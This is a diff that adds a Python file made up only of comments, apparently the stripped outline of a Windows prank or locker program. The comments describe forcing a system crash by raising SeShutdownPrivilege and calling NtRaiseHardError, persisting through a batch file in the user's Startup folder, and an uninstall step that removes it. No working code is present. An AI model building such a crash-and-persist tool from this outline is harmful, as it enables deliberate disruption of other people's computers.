@@ -1,0 +1,31 @@
+#! /usr/bin python
+# -*- coding: utf-8 -*-
+
+# Importing necessary libraries
+# Used to retrieve the current user's username
+# Provides functions to interact with the operating system
+# Allows capturing and simulating keyboard events
+# Provides C-compatible data types and allows calling functions in DLLs or shared libraries
+# Used to spawn new processes and interact with the system shell
+# Windows-specific types used in ctypes functions
+
+
+# Function to trigger a Blue Screen of Death (BSOD)
+
+# Run a command to access a non-existent or invalid file path (this might be system-specific)
+# Use ctypes to adjust system privileges to allow raising a critical error
+# Privilege 19 refers to "SeShutdownPrivilege" which is required to shut down the system
+# This raises a critical system error using Windows' NtRaiseHardError, which causes a BSOD
+# The error code 0xc0000022 generally indicates an access denied error
+# NtRaiseHardError triggers the shutdown type 6 (forcing the system to crash)
+
+# Function to ensure the script runs at startup
+  # Get the username of the currently logged-in user
+    # Define the path to the user's Startup folder, where programs can be set to run on startup
+    # Make this path global so that other functions (like uninstall) can access it
+    # Create a batch file in the Startup folder to automatically run the current script on startup
+     # The batch file will contain a command to start this script when the system boots up
+     
+# Function to uninstall (clean up) the startup process
+  # Destroy the window (in Tkinter or any GUI used in the main program)
+  # Remove the batch file created in the startup folder to stop the script from running at startup
